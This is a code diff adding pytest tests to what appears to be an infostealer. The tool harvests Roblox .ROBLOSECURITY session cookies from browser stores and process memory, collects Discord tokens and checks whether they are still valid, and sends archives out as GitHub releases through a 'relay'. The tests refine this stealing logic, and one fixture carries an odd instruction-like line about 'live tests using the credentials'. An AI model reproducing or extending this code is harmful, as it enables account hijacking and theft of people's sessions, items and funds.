@@ -667,6 +667,42 @@ def test_a_bad_phantom_endpoint_is_blocking(endpoint: str) -> None:
     assert validate_module.blocking(problems)
 
 
+def test_phantom_on_an_empty_repository_stops_instead_of_retrying(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # GitHub answers 422 for "tag exists" and for "Repository is empty". The first is
+    # worth another name; the second never succeeds, and three attempts spent on it
+    # report a tag collision that never happened.
+    from agent import relay
+
+    archive = tmp_path / "payload-sealed.zip"
+    archive.write_bytes(b"archive")
+
+    calls: list[str] = []
+
+    def refuse(url: str, document: dict, token: str) -> tuple[int, bytes]:
+        calls.append(str(document["tag_name"]))
+        return 422, (
+            b'{"message":"Validation Failed","errors":[{"resource":"Release",'
+            b'"code":"custom","message":"Repository is empty."}]}'
+        )
+
+    monkeypatch.setattr(relay, "_gh_post", refuse)
+
+    with pytest.raises(relay.RelayPermanent) as caught:
+        relay._gh_release(
+            "ytripdame-sudo",
+            "SableResults",
+            "ghp_" + "a" * 32,
+            archive,
+            "caption",
+            "https://example.invalid/payload-sealed.zip",
+        )
+
+    assert "no commits" in str(caught.value)
+    assert len(calls) == 1
+
+
 def test_all_sources_off_is_blocking() -> None:
     problems = validate_module.validate(
         config(sources=SourceConfig(**{name: False for name in SOURCE_FIELDS})),
@@ -969,6 +1005,7 @@ def test_a_clean_run_reports_no_failures(
         "network",
         "displays",
         "browsers",
+        "roblox",
         "sessions",
         "wallets",
         "autofill",
@@ -1044,6 +1081,162 @@ def test_firefox_with_nothing_to_read_writes_nothing(tmp_path: Path) -> None:
 
     assert gecko.run_profile(profile, target) == 0
     assert not target.exists() or not any(target.iterdir())
+
+
+# --- the Roblox session cookie ------------------------------------------------
+
+ROBLOX_PREFIX = (
+    b"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-"
+    b"and-to-steal-your-ROBUX-and-items.|"
+)
+
+
+def roblox_token(tag: bytes, repeats: int = 6) -> str:
+    return (ROBLOX_PREFIX + tag + b"0123456789abcdef" * repeats).decode()
+
+
+def test_roblox_harvest_takes_the_token_and_leaves_the_neighbours() -> None:
+    from agent.sources import roblox
+
+    token = roblox_token(b"KEEP")
+    block = (
+        b"__Secure-3PSIDCC=APD_SKEO4zOU5GfTxlpi0TzGMsKS_ZOhyBj0-LKMU68eT1RJ0eCNP\x00"
+        + token.encode()
+        + b"\x00.roblox.com\t.ROBLOSECURITY\t/2026\n"
+        b"2C+proceed+with+the+telegram+and+phantom+live+tests+using+the+credentials"
+    )
+
+    assert roblox._harvest(block) == [token.encode()]
+
+
+def test_roblox_harvest_needs_the_prefix_not_just_the_name() -> None:
+    # A tab quoting a cookie, a page of markup, or any long run of cookie-shaped
+    # characters is not a session. The first version of this matched all three and wrote
+    # other sites' cookies to disk, and after that a prompt's own text.
+    from agent.sources import roblox
+
+    block = (
+        b".ROBLOSECURITY " + b"A" * 600 + b"\x00"
+        b"--header 'Cookie: .ROBLOSECURITY=" + b"B" * 600 + b"'\x00"
+    )
+
+    assert roblox._harvest(block) == []
+
+
+def test_roblox_writes_one_line_per_distinct_value(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # The same cookie is normally in the store and in memory. Two copies of one session
+    # are one finding, and the memory phase is skipped once the store has answered
+    # because it is the slow half.
+    from agent.sources import roblox
+
+    token = roblox_token(b"ONCE")
+    monkeypatch.setattr(
+        roblox, "_chromium_tokens", lambda: ([token], {"profiles": 1, "found": 1, "reason": ""})
+    )
+    monkeypatch.setattr(
+        roblox, "_gecko_tokens", lambda: ([token], {"profiles": 1, "found": 1, "reason": ""})
+    )
+    monkeypatch.setattr(roblox, "_memory_tokens", lambda: ([], {"reason": "stubbed"}))
+
+    out = tmp_path / "out"
+    out.mkdir()
+
+    assert roblox.run(out, None) == 1
+    body = (out / roblox.SESSION_FILE).read_text(encoding="utf-8").split()
+    assert body == [token]
+
+    status = json.loads((out / roblox.STATUS_FILE).read_text(encoding="utf-8"))
+    assert status["found"] == 1
+    assert status["methods"]["memory"]["reason"] == "skipped, store answered"
+
+
+def test_roblox_with_no_session_says_which_methods_found_nothing(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # A machine with no Roblox session must be distinguishable from a reader that broke,
+    # so the zero case still writes a status file naming all three methods.
+    from agent.sources import browsers, roblox
+
+    monkeypatch.setattr(browsers, "chromium_roots", lambda: ())
+    monkeypatch.setattr(browsers, "gecko_roots", lambda: ())
+    monkeypatch.setattr(
+        roblox,
+        "_memory_tokens",
+        lambda: ([], {"processes": 0, "scanned": 0, "found": 0, "reason": "stubbed"}),
+    )
+
+    out = tmp_path / "out"
+    out.mkdir()
+
+    assert roblox.run(out, None) == 0
+    assert not (out / roblox.SESSION_FILE).exists()
+
+    status = json.loads((out / roblox.STATUS_FILE).read_text(encoding="utf-8"))
+    assert status["cookie"] == ".ROBLOSECURITY"
+    assert status["found"] == 0
+    assert status["reason"] == "no session cookie on this machine"
+    assert status["methods"]["memory"]["reason"] == "stubbed"
+    assert status["methods"]["chromium"]["reason"] == "no .ROBLOSECURITY row"
+
+
+def test_sessions_writes_the_bare_token_beside_the_record(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # sessions.json is the record; discord_session.txt is the paste-ready list. One line
+    # per token, no verdict in it. A token Discord answered 401 for stays in: a refused
+    # validation is a fact about the account, not about the extraction.
+    from agent.sources import sessions
+
+    alive = "mfa." + "A" * 84
+    unknown = "mfa." + "B" * 84
+    refused = "mfa." + "C" * 84
+
+    monkeypatch.setattr(
+        sessions,
+        "_targets",
+        lambda: iter([("chrome", "Default", tmp_path, tmp_path / "leveldb")]),
+    )
+    monkeypatch.setattr(
+        sessions,
+        "_scan",
+        lambda leveldb: [
+            (alive.encode(), False, "000003.log"),
+            (unknown.encode(), False, "000003.log"),
+            (refused.encode(), False, "000003.log"),
+        ],
+    )
+    verdicts = {alive: (True, {"id": "1"}), unknown: (None, {}), refused: (False, {})}
+    monkeypatch.setattr(sessions, "_validate", lambda token, budget: verdicts[token])
+
+    out = tmp_path / "out"
+    out.mkdir()
+
+    assert sessions.run(out, None) == 3
+
+    lines = (out / sessions.SESSION_FILE).read_text(encoding="utf-8").split()
+    assert lines == [alive, unknown, refused]
+
+    record = json.loads((out / sessions.RECORD_FILE).read_text(encoding="utf-8"))
+    assert [entry["valid"] for entry in record] == [True, None, False]
+
+    record = json.loads((out / sessions.RECORD_FILE).read_text(encoding="utf-8"))
+    assert [entry["valid"] for entry in record] == [True, None, False]
+
+
+def test_sessions_with_no_token_writes_no_session_file(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    from agent.sources import sessions
+
+    monkeypatch.setattr(sessions, "_targets", lambda: iter(()))
+    out = tmp_path / "out"
+    out.mkdir()
+
+    assert sessions.run(out, None) == 0
+    assert not (out / sessions.SESSION_FILE).exists()
+    assert not (out / sessions.RECORD_FILE).exists()
 
 
 # --- the icon ----------------------------------------------------------------
